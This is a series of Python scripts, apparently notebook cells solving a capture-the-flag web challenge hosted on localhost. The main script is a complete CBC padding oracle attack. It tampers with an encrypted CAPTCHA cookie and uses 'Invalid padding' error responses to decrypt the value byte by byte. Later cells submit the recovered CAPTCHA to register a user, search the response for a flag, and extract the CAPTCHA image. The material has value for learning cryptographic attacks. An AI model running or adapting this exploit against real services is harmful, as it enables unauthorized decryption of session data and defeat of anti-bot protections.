import requests
import base64
import re

base_url = "http://127.0.0.1:33002"
BLOCK_SIZE = 16

def test_oracle(session, modified_captcha_b64, csrf_token):
    """
    Returns True if padding is valid (NOT "Invalid padding")
    """
    session.cookies.set('captcha', modified_captcha_b64, domain='127.0.0.1', path='/')
    
    data = {
        'csrf_token': csrf_token,
        'username': 'oracle_test',
        'captcha': '12345',
        'submit': 'Create User'
    }
    
    try:
        resp = session.post(f"{base_url}/", data=data, allow_redirects=True)
        if "Invalid padding" in resp.text:
            return False
        return True
    except:
        return None

# Get a fresh captcha cookie
session = requests.Session()
resp = session.get(f"{base_url}/")

# Extract CSRF token
csrf_match = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text)
csrf_token = csrf_match.group(1) if csrf_match else ""

# Get the captcha from cookies (it should be set now)
captcha_b64 = session.cookies.get('captcha')

if not captcha_b64:
    # Fall back to provided cookie
    captcha_b64 = "hWlOzGJIEXjbBbkpSz/JN6UCPymOe4OA6y9SOuLnis0="

print(f"[+] Using captcha: {captcha_b64}")

ciphertext = base64.b64decode(captcha_b64)
print(f"[+] Ciphertext length: {len(ciphertext)} bytes")
print(f"[+] Ciphertext hex: {ciphertext.hex()}")

# Blocks
IV = bytearray(ciphertext[:BLOCK_SIZE])
C1 = bytearray(ciphertext[BLOCK_SIZE:])  # May only have 1 block if auth data

print(f"[+] IV: {IV.hex()}")
print(f"[+] Number of ciphertext blocks: {len(ciphertext) // BLOCK_SIZE}")

# If there's an auth_tag, we only work with first block
if len(ciphertext) >= 2 * BLOCK_SIZE:
    C1 = bytearray(ciphertext[BLOCK_SIZE:2*BLOCK_SIZE])
    print(f"[+] C1: {C1.hex()}")
else:
    print(f"[+] Only one block of ciphertext: {C1.hex() if C1 else 'None'}")

# Padding Oracle Attack
INT1 = bytearray(BLOCK_SIZE)
P1 = bytearray(BLOCK_SIZE)

print(f"\n[*] Starting padding oracle attack...")

for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
    pad_val = BLOCK_SIZE - byte_pos
    
    for test_val in range(256):
        test_IV = bytearray(IV)
        test_IV[byte_pos] = test_val
        
        for i in range(byte_pos + 1, BLOCK_SIZE):
            test_IV[i] = INT1[i] ^ pad_val
        
        test_cipher = bytes(test_IV) + bytes(C1)
        test_b64 = base64.b64encode(test_cipher).decode()
        
        if test_oracle(session, test_b64, csrf_token):
            INT1[byte_pos] = test_val ^ pad_val
            P1[byte_pos] = IV[byte_pos] ^ INT1[byte_pos]
            print(f"[*] Byte {byte_pos}: 0x{P1[byte_pos]:02x} ('{chr(P1[byte_pos]) if 32 <= P1[byte_pos] < 127 else '?' }')")
            break

# Remove PKCS7 padding
pad_len = P1[-1]
if 1 <= pad_len <= BLOCK_SIZE:
    plaintext_no_pad = P1[:-pad_len]
else:
    plaintext_no_pad = P1.rstrip(b'\x00').rstrip(b'\x02')

print(f"\n[+] Decrypted captcha: {plaintext_no_pad.decode('latin-1')}")


import requests
import re

base_url = "http://127.0.0.1:33002"

# The decrypted captcha value is "BW9OBB0LXW21GM"
captcha_value = "BW9OBB0LXW21GM"

# Try different approaches
# Approach 1: Keep same session throughout
print("[+] Approach 1: Single session flow")
session = requests.Session()
resp = session.get(f"{base_url}/")
print(f"    GET Status: {resp.status_code}")
print(f"    Captcha cookie: {session.cookies.get('captcha')}")

# Extract CSRF token
csrf_match = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text)
csrf_token = csrf_match.group(1) if csrf_match else ""
print(f"    CSRF token: {csrf_token}")

# Submit with the decrypted captcha
register_data = {
    'csrf_token': csrf_token,
    'username': 'testuser123',
    'captcha': captcha_value,
    'submit': 'Create User'
}

print(f"    Submitting with captcha: {captcha_value}")
resp = session.post(f"{base_url}/", data=register_data)
print(f"    POST Status: {resp.status_code}")
print(f"    Response: {resp.text[:500]}")

if "FLAG" in resp.text:
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    if flag_match:
        print(f"    [!] FLAG: {flag_match.group(0)}")


import requests
import re
import base64

base_url = "http://127.0.0.1:33002"

# Get the page and look at the captcha image
session = requests.Session()
resp = session.get(f"{base_url}/")

print(f"[*] GET / Status: {resp.status_code}")
print(f"[*] Response length: {len(resp.text)}")

# Look for captcha image
img_match = re.search(r'alt="CAPTCHA"[^>]*src="data:image/[^;]+;base64,([^"]+)"', resp.text, re.IGNORECASE)
if img_match:
    img_b64 = img_match.group(1)
    print(f"[+] Found CAPTCHA image (base64 length: {len(img_b64)})")
    # Save to see what it looks like
    img_data = base64.b64decode(img_b64)
    print(f"[+] Image data size: {len(img_data)} bytes")
else:
    print("[-] No CAPTCHA image found")

# Look for any hidden captcha value
hidden_match = re.search(r'type="hidden"[^>]*name="captcha"[^>]*value="([^"]+)"', resp.text, re.IGNORECASE)
if hidden_match:
    print(f"[+] Hidden captcha value: {hidden_match.group(1)}")

# Look at the form action
form_match = re.search(r'<form[^>]*action="([^"]*)"', resp.text, re.IGNORECASE)
if form_match:
    print(f"[+] Form action: {form_match.group(1)}")

# Look at what the captcha input field looks like
captcha_input = re.search(r'<input[^>]*name="captcha"[^>]*>', resp.text, re.IGNORECASE)
if captcha_input:
    print(f"[+] Captcha input: {captcha_input.group(0)}")

# Print just the form HTML
form_html = re.search(r'<form.*?</form>', resp.text, re.DOTALL)
if form_html:
    print(f"\n[*] Form HTML:\n{form_html.group(0)[:1500]}")


import requests
import base64

base_url = "http://127.0.0.1:33002"

# Get the page and extract the captcha image
session = requests.Session()
resp = session.get(f"{base_url}/")

# Extract the full image data
import re
img_match = re.search(r'src="data:image/png;base64,([^"]+)"', resp.text)
if img_match:
    img_b64 = img_match.group(1)
    img_data = base64.b64decode(img_b64)
    
    print(f"[+] Captcha image extracted ({len(img_data)} bytes)")
    
    # Save to file
    with open('/tmp/captcha.png', 'wb') as f:
        f.write(img_data)
    print("[+] Saved to /tmp/captcha.png")
    
    # Try to analyze the image
    from PIL import Image
    import io
    
    img = Image.open(io.BytesIO(img_data))
    print(f"[+] Image size: {img.size}")
    print(f"[+] Image mode: {img.mode}")
    
    # Show the image
    display(img)
else:
    print("[-] No captcha image found")

